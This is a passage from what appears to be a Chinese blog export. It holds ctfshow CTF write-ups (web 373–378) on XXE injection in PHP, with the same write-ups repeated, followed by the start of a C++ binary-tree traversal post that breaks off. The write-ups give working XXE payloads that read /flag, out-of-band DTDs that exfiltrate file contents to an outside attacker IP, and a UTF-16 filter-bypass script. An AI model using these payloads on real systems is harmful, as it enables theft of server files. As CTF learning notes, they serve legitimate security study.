id=\"ctfshow-web-376\"><a href=\"#ctfshow-web-376\" class=\"headerlink\" title=\"ctfshow web 376\"></a>ctfshow web 376</h3><p>这题只是将正则转变成了不区分大小写,payload还是同上375题的</p>\n<h3 id=\"ctfshow-web-377\"><a href=\"#ctfshow-web-377\" class=\"headerlink\" title=\"ctfshow web 377\"></a>ctfshow web 377</h3><p>题目代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">libxml_disable_entity_loader(<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"variable\">$xmlfile</span> = file_get_contents(<span class=\"string\">&#x27;php://input&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/&lt;\\?xml version=&quot;1\\.0&quot;|http/i&#x27;</span>, <span class=\"variable\">$xmlfile</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;error&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$xmlfile</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$dom</span> = <span class=\"keyword\">new</span> DOMDocument();</span><br><span class=\"line\">    <span class=\"variable\">$dom</span>-&gt;loadXML(<span class=\"variable\">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);  </span><br></pre></td></tr></table></figure>\n\n<p>本题对http关键字做了过滤,但是xml可以用utf16编码</p>\n<h5 id=\"payload-3\"><a href=\"#payload-3\" class=\"headerlink\" title=\"payload\"></a>payload</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">payload=<span class=\"string\">&quot;&quot;&quot;&lt;!DOCTYPE test [</span></span><br><span class=\"line\"><span class=\"string\">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;!ENTITY % aaa SYSTEM &quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">%aaa;</span></span><br><span class=\"line\"><span class=\"string\">]&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;test&gt;123&lt;/test&gt;&quot;&quot;&quot;</span></span><br><span class=\"line\">url=<span class=\"string\">&quot;http://032b023b-084a-41ee-9c3e-2a3bec8669da.challenge.ctf.show&quot;</span></span><br><span class=\"line\">requests.post(url=url,data=payload.encode(<span class=\"string\">&quot;utf-16&quot;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>有个疑问:用web377用python转换成utf-16编码后post包用burp抓住后,里面还是包含http字符串的,咋就绕过了呢</p>\n<p>这个是用burp抓的python发的包</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110205856482.png\" alt=\"image-20220110205856482\"></p>\n<h3 id=\"ctfshow-web-378\"><a href=\"#ctfshow-web-378\" class=\"headerlink\" title=\"ctfshow web 378\"></a>ctfshow web 378</h3><h5 id=\"payload-4\"><a href=\"#payload-4\" class=\"headerlink\" title=\"payload\"></a>payload</h5><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">test</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这道题的payload很简单,但是起初我一直抓不到发给dologin的数据包,这是为何????,但是后面又抓到了…..</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110205445709.png\" alt=\"image-20220110205445709\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"ctfshow\"><a href=\"#ctfshow\" class=\"headerlink\" title=\"ctfshow\"></a>ctfshow</h2><h3 id=\"ctfshow-web-373\"><a href=\"#ctfshow-web-373\" class=\"headerlink\" title=\"ctfshow web 373\"></a>ctfshow web 373</h3><p>php://input</p>\n<p>从官网信息来看，php://input是一个只读信息流，当请求方式是post的，并且enctype不等于”multipart/form-data”时，可以使用php://input来获取原始请求的数据。</p>\n<p>数据包中反倒是不管是get还是post,php://input都会<label style=\"color:red\">读取post类型数据包中变量位置</label>的数据(就是header头空一行下面的数据)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">libxml_disable_entity_loader(<span class=\"literal\">false</span>);<span class=\"comment\">//设置为false则允许外部实体加载</span></span><br><span class=\"line\"><span class=\"variable\">$xmlfile</span> = file_get_contents(<span class=\"string\">&#x27;php://input&#x27;</span>);<span class=\"comment\">//将获取到的数据包内容转换成字符串</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$xmlfile</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$dom</span> = <span class=\"keyword\">new</span> DOMDocument();</span><br><span class=\"line\">    <span class=\"variable\">$dom</span>-&gt;loadXML(<span class=\"variable\">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class=\"comment\">//LIBXML_NOENT 该标志允许替换XML字符实体引用(无论是否外部)也就是允许 &amp;a; 这样的写法</span></span><br><span class=\"line\">    <span class=\"variable\">$creds</span> = simplexml_import_dom(<span class=\"variable\">$dom</span>);<span class=\"comment\">//把 DOM 节点转换为 SimpleXMLElement 对象。</span></span><br><span class=\"line\">    <span class=\"variable\">$ctfshow</span> = <span class=\"variable\">$creds</span>-&gt;ctfshow;<span class=\"comment\">//找到里面的ctfshow标签</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$ctfshow</span>;<span class=\"comment\">//输出ctfshow标签的内容</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>综合上面的分析,得知只需要将ctfshow标签中的内容设置成想要的内容即可,但是不能直接将ctfshow设置为根标签,在外部随便加一个标签就行</p>\n<h5 id=\"payload\"><a href=\"#payload\" class=\"headerlink\" title=\"payload\"></a>payload</h5><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">test</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\">//上面为内部dtd文档</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">neo</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ctfshow</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">ctfshow</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ctfshow-web-374\"><a href=\"#ctfshow-web-374\" class=\"headerlink\" title=\"ctfshow web 374\"></a>ctfshow web 374</h3><p>本题没有回显,需要使用外带dtd</p>\n<p>利用python在云服务器搭建一个http服务器,并保持监听</p>\n<p><code>python3 -m http.server 5555</code></p>\n<p>题目代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">libxml_disable_entity_loader(<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"variable\">$xmlfile</span> = file_get_contents(<span class=\"string\">&#x27;php://input&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$xmlfile</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$dom</span> = <span class=\"keyword\">new</span> DOMDocument();</span><br><span class=\"line\">    <span class=\"variable\">$dom</span>-&gt;loadXML(<span class=\"variable\">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);    </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>本题有个疑问,就是为什么要使用php伪协议,突然想到本题没有回显,结合做过的文件包含题目,只有采用php伪协议才能读取到源码,就算是将文件包含进去了,也是执行代码,代码中不做输出,页面就不会显示输出</p>\n<p>起初这样写了dtd文档</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % b SYSTEM &quot;http://121.40.113.226:5555/php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class=\"line\">%b;</span><br></pre></td></tr></table></figure>\n\n<p>xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE a[</span></span><br><span class=\"line\"><span class=\"meta\">\t<span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">\t%xxe;</span></span><br><span class=\"line\"><span class=\"meta\"></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>服务端给了这样的回显,说明是没有使用php协议,当成了路径,仔细一想,应该使用另一个实体来替换后面的伪协议内容</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110180025568.png\" alt=\"image-20220110180025568\"></p>\n<p> 更改后的dtd文档</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % b SYSTEM &quot;http://121.40.113.226:5555/%file;&quot;&gt;</span><br><span class=\"line\">%b;</span><br></pre></td></tr></table></figure>\n\n<p>这次服务端回显了200,说明有成功请求到dtd文档,但是忘了一个问题,这里的file变量需要读取的内容在靶机上,而我这样写就是读取攻击机的内容了……</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110180342295.png\" alt=\"image-20220110180342295\"></p>\n<p>查看了别人写的payload,明白了基本原理:利用xml的变量机制,把请求路径转换成通过base64编码的文件内容,所以得到的返回值是404</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110182024289.png\" alt=\"image-20220110182024289\"></p>\n<h5 id=\"payload-1\"><a href=\"#payload-1\" class=\"headerlink\" title=\"payload\"></a>payload</h5><p>xml</p>\n<p>xml通过前面的尝试已经完全理解了</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">test</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">file</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">aaa</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">%aaa;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">test</span>&gt;</span>123<span class=\"tag\">&lt;/<span class=\"name\">test</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>dtd</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://121.40.113.226:5555/%file;&#x27;&gt; &quot;&gt;</span><br><span class=\"line\">%dtd;</span><br><span class=\"line\">%xxe;</span><br></pre></td></tr></table></figure>\n\n<p>有两个问题,</p>\n<p>第一个就是为什么要将%进行编码为<code>&amp;#x25;</code>,我的理解是实体里面包含实体因为引号的原因,需要将其进行编码,我又进行了尝试,将第一个%也编码成<code>&amp;#x25;</code>,未成功</p>\n<p>第二个是为什么要实体里面包含实体,不能直接执行</p>\n<p><code>&lt;!ENTITY % xxe  SYSTEM &quot;http://121.40.113.226:5555/%file;&quot;&gt;  %xxe;</code></p>\n<p>但是如果写成这样,请求的路径就还是dtd文档了<img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110183234994.png\" alt=\"image-20220110183234994\"></p>\n<p>在尝试中一个偶然的错误让我有了启发,—-我忘记给dtd中的url加端口了</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110183404676.png\" alt=\"image-20220110183404676\"></p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110183422805.png\" alt=\"image-20220110183422805\"></p>\n<p>此时的请求路径还是dtd文档,那也就是说,之前所有请求文档的都是因为%aaa和dtd文档的错误书写</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110183448490.png\" alt=\"image-20220110183448490\"></p>\n<p>在dtd中如果颠倒%dtd和%xxe的顺序,请求路径还是dtd文档</p>\n<p>突然看到用payload的时候请求信息是两条,</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110185118318.png\" alt=\"image-20220110185118318\"></p>\n<p>然后将dtd文档改成</p>\n<p><code>&lt;!ENTITY % xxe  SYSTEM &#39;http://121.40.113.226:5555/1;&#39;&gt; %xxe;</code></p>\n<p>请求路径还是两条</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110185242294.png\" alt=\"image-20220110185242294\"></p>\n<p>这个时候突然恍然大悟,为什么要用外部实体包裹它呢,是因为单个实体无法使用%file对路径进行替换,<laber style=\"color:red\">真正发请求的还是%xxe</label>,用%dtd包裹它就可以使用%file对其进行替换,所以是先执行%dtd再执行%xxe</p>\n<h3 id=\"ctfshow-web-375\"><a href=\"#ctfshow-web-375\" class=\"headerlink\" title=\"ctfshow web 375\"></a>ctfshow web 375</h3><p>题目代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">libxml_disable_entity_loader(<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"variable\">$xmlfile</span> = file_get_contents(<span class=\"string\">&#x27;php://input&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/&lt;\\?xml version=&quot;1\\.0&quot;/&#x27;</span>, <span class=\"variable\">$xmlfile</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;error&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$xmlfile</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$dom</span> = <span class=\"keyword\">new</span> DOMDocument();</span><br><span class=\"line\">    <span class=\"variable\">$dom</span>-&gt;loadXML(<span class=\"variable\">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);    </span><br></pre></td></tr></table></figure>\n\n<p>相较于374只是过滤了xml标签,但是没有xml对xml内容的读取没啥影响</p>\n<h5 id=\"payload-2\"><a href=\"#payload-2\" class=\"headerlink\" title=\"payload\"></a>payload</h5><p>xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">test</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">file</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">aaa</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">%aaa;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">test</span>&gt;</span>123<span class=\"tag\">&lt;/<span class=\"name\">test</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>dtd</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://121.40.113.226:5555/%file;&#x27;&gt; &quot;&gt;</span><br><span class=\"line\">%dtd;</span><br><span class=\"line\">%xxe;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ctfshow-web-376\"><a href=\"#ctfshow-web-376\" class=\"headerlink\" title=\"ctfshow web 376\"></a>ctfshow web 376</h3><p>这题只是将正则转变成了不区分大小写,payload还是同上375题的</p>\n<h3 id=\"ctfshow-web-377\"><a href=\"#ctfshow-web-377\" class=\"headerlink\" title=\"ctfshow web 377\"></a>ctfshow web 377</h3><p>题目代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">libxml_disable_entity_loader(<span class=\"literal\">false</span>);</span><br><span class=\"line\"><span class=\"variable\">$xmlfile</span> = file_get_contents(<span class=\"string\">&#x27;php://input&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">&#x27;/&lt;\\?xml version=&quot;1\\.0&quot;|http/i&#x27;</span>, <span class=\"variable\">$xmlfile</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;error&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$xmlfile</span>))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$dom</span> = <span class=\"keyword\">new</span> DOMDocument();</span><br><span class=\"line\">    <span class=\"variable\">$dom</span>-&gt;loadXML(<span class=\"variable\">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);  </span><br></pre></td></tr></table></figure>\n\n<p>本题对http关键字做了过滤,但是xml可以用utf16编码</p>\n<h5 id=\"payload-3\"><a href=\"#payload-3\" class=\"headerlink\" title=\"payload\"></a>payload</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">payload=<span class=\"string\">&quot;&quot;&quot;&lt;!DOCTYPE test [</span></span><br><span class=\"line\"><span class=\"string\">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;!ENTITY % aaa SYSTEM &quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">%aaa;</span></span><br><span class=\"line\"><span class=\"string\">]&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;test&gt;123&lt;/test&gt;&quot;&quot;&quot;</span></span><br><span class=\"line\">url=<span class=\"string\">&quot;http://032b023b-084a-41ee-9c3e-2a3bec8669da.challenge.ctf.show&quot;</span></span><br><span class=\"line\">requests.post(url=url,data=payload.encode(<span class=\"string\">&quot;utf-16&quot;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>有个疑问:用web377用python转换成utf-16编码后post包用burp抓住后,里面还是包含http字符串的,咋就绕过了呢</p>\n<p>这个是用burp抓的python发的包</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110205856482.png\" alt=\"image-20220110205856482\"></p>\n<h3 id=\"ctfshow-web-378\"><a href=\"#ctfshow-web-378\" class=\"headerlink\" title=\"ctfshow web 378\"></a>ctfshow web 378</h3><h5 id=\"payload-4\"><a href=\"#payload-4\" class=\"headerlink\" title=\"payload\"></a>payload</h5><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">test</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>这道题的payload很简单,但是起初我一直抓不到发给dologin的数据包,这是为何????,但是后面又抓到了…..</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220110205445709.png\" alt=\"image-20220110205445709\"></p>\n"},{"title":"二叉树遍历","date":"2021-12-04T15:11:02.000Z","typora-root-url":"..","_content":"\n二叉树的前中后序递归和非递归遍历和层序遍历代码实现\n\n<!--more-->\n\n```\n#include<iostream>\n#include<stdlib.h>\nusing namespace std;\n#define STACK_INIT_SIZE 100//存储空间初始分配量\n#define STACKINCREMENT 10//存储空间分配增量\n\ntypedef struct BiTNode {\n\tchar data;\n\tstruct BiTNode* lchild, * rchild;\n}BiTNode,* BiTree;\ntypedef struct Node\n{\n\tBiTNode* treeNode;\n\tNode* next;\n}Node;\ntypedef struct LinkQueue {\n\tNode* front;\n\tNode* rear;\n\n}LinkQueue;\ntypedef struct {\n\tBiTNode* top;\n\tBiTNode* base;\n\tint size;\n\n}stack;\nvoid createBiTree(BiTree& t);\nvoid preOrderTraverse(BiTree t);\nvoid inOrderTraverse1(BiTree t);\nvoid postOrderTraverse(BiTree t);\nint getDeep(BiTree t);\nbool initQueue(LinkQueue& Q);\nbool enQueue(LinkQueue& Q, BiTNode treeNode);\nvoid deQueue(LinkQueue& Q);\nvoid floorTraverse(LinkQueue& Q, BiTree& t);\nvoid inOrderTraverse2(stack s, BiTree& t);\nvoid initStack(stack& s);\nbool isEmpty(stack& s);\nvoid push(stack& s, BiTNode treeNode);\nBiTNode pop(stack& s);\n\nint main() {\n\tBiTree t;\n\tstack s;\n\tinitStack(s);\n\tLinkQueue Q;\n\tinitQueue(Q);\n\tcreateBiTree(t);\n\tcout << \"二叉树创建完成\" << endl<<endl;\n\tcout << \"先序遍历\" << endl;\n\tpreOrderTraverse(t);\n\tcout << endl;\n\tcout << \"递归中序遍历\" <<endl;\n\tinOrderTraverse1(t);\n\tcout << endl;\n\tcout << \"非递归中序遍历\" << endl;\n\tinOrderTraverse2(s, t);\n\tcout << endl;\n\tcout << \"后序遍历\" << endl;\n\tpostOrderTraverse(t);\n\tcout << endl;\n\tcout << \"层序遍历\" << endl;\n\tfloorTraverse(Q, t);\n\tcout << endl;\n\t\n\tcout << \"二叉树的深度为\" << getDeep(t) << endl;\n\treturn 0;\n}\nvoid createBiTree(BiTree& t) {\n\tchar c;\n\tcin >> c;\n\tif (c == '$')\n\t\t//利用给先序遍历序列添加空节点保证建立二叉树的唯一性\n\t\tt = NULL;\n\telse 